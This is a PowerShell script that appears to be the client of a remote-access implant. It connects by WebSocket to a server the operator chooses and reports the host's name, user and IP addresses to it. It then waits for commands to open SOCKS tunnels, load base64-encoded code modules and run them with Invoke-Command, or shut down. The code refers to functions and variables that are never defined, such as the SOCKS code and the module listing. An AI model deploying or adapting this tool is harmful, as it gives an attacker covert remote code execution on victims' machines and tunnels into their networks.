param (
    [Parameter(Mandatory=$true)][string]$server,
    [string]$logfile = $null
)

$client = {
    $server = $args[0]
    $logfile = $args[1]
    $client = [ScriptBlock]::Create($args[2])
    $loadedModules = @{}

    Function Write-Log
    {
    Param ([string]$text)

    if($logfile){
        $text = (Get-Date -Format "[HH:mm K dd/MM/yyyy] ").toString() + $text
        Add-content $logfile -value $text
        }

        # Show message in verbose mode
        Write-Verbose $text
    }

    Function Service-socks{
        Param(
        [Parameter(Mandatory = $true)]
        [string]$server,
        [Parameter(Mandatory = $true)]
        [string]$address,
        [Parameter(Mandatory = $true)]
        [string]$port,
        [Parameter(Mandatory = $true)]
        [string]$to
        )

        Start-Job -ScriptBlock $socksCode -ArgumentList $server, $address, $port, $to | Out-Null
    }


    Function Encode-base64{
        Param(
        [Parameter(Mandatory = $true)]
        [string]$msg
        )

        $Bytes = [System.Text.Encoding]::UTF8.GetBytes($msg)
        $EncodedText =[Convert]::ToBase64String($Bytes)

        return $EncodedText
    }

    Function Send-Message {
        Param(
        [Parameter(Mandatory = $true)]
        [hashtable]$msg,
            
        [Parameter(Mandatory = $true)]
        $to,
            
        $Timeout = 30
        )

        if($ws.State -eq "Open"){
            try{
                # Prepare data

                $data = @{"action" = "sendmsg"; # Change to proper route in lambda
                    "to" =  $to;
                    "payload" = $msg
                    }

                $dataJSON = (New-Object -TypeName PSObject -Prop $data) | ConvertTo-Json -Depth 6

                $sendArray = @()
                $Encoding = [System.Text.Encoding]::UTF8
                $sendArray = $Encoding.GetBytes($dataJSON)

                $dataBytes = New-Object System.ArraySegment[byte] -ArgumentList @(,$sendArray)

                $ConnSend = $ws.SendAsync($dataBytes, [System.Net.WebSockets.WebSocketMessageType]::Text, [System.Boolean]::TrueString, $ct)
        }catch{
        Write-Log "Failed to send message. $($PSItem.Exception.Message)"
        }


        }else{
            Write-Log "Tried to send message but the connection is closed: $($msg | out-string)"
        }
    }

    Function Connect-Websocket{
        Param(
        [Parameter(Mandatory = $true)]
        [string]$server
        )

        try{
            $ws = New-Object System.Net.WebSockets.ClientWebSocket
            $ct = New-Object System.Threading.CancellationToken
        
            Write-Log "Connecting to $($server)"

            # Get basic info
            
            $hostname = (Invoke-Expression "hostname" | out-string).Trim()
            $whoami = (Invoke-Expression "whoami" | Out-String).Trim()

            $ipsList = @()

            Foreach-Object -InputObject (Get-NetAdapter){
                # Get IP Addresses of interface
                $ipAddresses = $_ | Get-NetIPAddress


                foreach($ipAddress in $ipAddresses){
                    $ipsList += $($ipAddress.IPAddress)
                }

            }

            $ips = ($ipsList -Join ", ").Trim()

            # Add parameters
            $serverParams = "$($server)?name=$($hostname)&h=$($hostname)&w=$($whoami)&i=$($ips)"        

            $Conn = $ws.ConnectAsync($serverParams, $ct)

            # Wait until the connection is established
            while(!$Conn.IsCompleted) {
                Start-Sleep -Milliseconds 100
            }

            if($Conn.Status -eq "Faulted"){
                # Connection failed
                $status = 400
                Write-Log "Error establishing connection to $($serverParams)"
            }

            if($ws.State -eq "Open"){
                # We are connected
                $status = 200
                Write-Log "Connection established"
            }

        }catch{
            $ws = $null
            $ct = $null
            # Something is bad
            $status = 400

            Write-Log "Error establishing connection. $($PSItem.Exception.Message)"
        }

        return @{"status" = $status;
            "ws" = $ws;
            "ct" = $ct
        };
    }

    Function Service-LoadModule {
        Param(
        [Parameter(Mandatory = $true)]
        [PSCustomObject]$module
        )

        $loadedFunctions = @()
        $msg = " "
        $status = 500
        try{
            #if module exists drop
            if($loadedModules.ContainsKey($module.name)) { return @{"status" = 403} }

            # Decode code
            $code = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($module.code))

            # Load Module
            Write-Log "Save module..."

            # Add module to global list
            $loadedModules.Add($module.name, [ScriptBlock]::Create($code))
            # All ok
            $status = 200

        }catch{
            # Catch errors
            $msg = $PSItem.Exception.Message
        }
        
        return @{"service" = "loadmodule"; "status" = $status; "msg" =  $msg; "functions" = $loadedFunctions}
    }

    Function Service-RemoveModule{
        Param(
            [Parameter(Mandatory = $true)]
            [string]$module
        )

        $msg = " "
        try{
            # Check if module exists
            if($loadedModules.ContainsKey($module.name)){
                # Remove module
                $loadedModules.Remove($module.name)
                $status = 200
            }else{
                # Module not found
                $status = 404
            }
        }catch{
            $status = 404
            $msg = $PSItem.Exception.Message
        }

        @{"status" = $status; "msg" = $msg}
    }

    try{
        $Websockets = Connect-Websocket -server $server

        if($Websockets.status -eq 200){
            $ws = $Websockets.ws
            $ct = $Websockets.ct
        }else{
            exit # For now exit
        }

        # Create buffer
        $array_size = 8192
        $array = [byte[]] @(,0) * $array_size
        $data = New-Object System.ArraySegment[byte] -ArgumentList @(,$Array)

        # Main loop
        while($ws.State -eq "Open"){
            # Get new data
            $message = ""
            
            Do {
                $Conn = $ws.ReceiveAsync($data, $ct)
                while(!$Conn.IsCompleted){Start-Sleep -Milliseconds 100}

                $data.Array[0..($Conn.Result.Count - 1)] | ForEach-Object { $message += [char]$_}

            } Until($Conn.Result.Count -lt $array_size)

            Write-Log "Received message $($message)"

            if($message){
                    # Convert message to JSON
                    $message = ($message | convertfrom-json)
                    $to = $message.from
                    
                    $payload = $message.payload
                    $service = $payload.service

                    # Log service call
                    Write-Log "Service: '$($service)'"
                    switch($service){
                        # Execute service

                        {$_ -eq "tunnel"}{
                            Service-socks -server $server -address $payload.host -port $payload.port -to $to
                            $response = ""
                        }

                        {$_ -eq "loadmodule"}{
                            $response = Service-LoadModule -module $payload
                        }

                        {$_ -eq "listmodules"}{
                            $response = Service-ListModules
                        }

                        {$_ -eq "kill"}{
                            exit
                        }

                        default {
                            if($loadedModules.ContainsKey($_)){
                                $response = $null
                                Invoke-Command -ScriptBlock $loadedModules[$_] -ArgumentList $payload,$to
                            }
                            else{
                                # Service not implemented
                                Write-Log "Service '$($service)' not found"
                                $response = @{"service" = $service; "error" = 404}
                            }
                        }
                    }
                    # Always send response to server and log response
                    if($response){
                        Send-Message -msg $response -to $to
                        Write-Log "Service response: $($response | Out-String)"
                    }
            }
    }    
        
    }catch{
        Write-Log "Crashed. $($PSItem.Exception.Message)"
    } Finally{
        # Close websocket
        if($ws){
            Write-Log "Closing Websockets"
            $ws.Dispose()
        }
    }
}

Invoke-Command -ScriptBlock $client -ArgumentList $server,$logfile,$client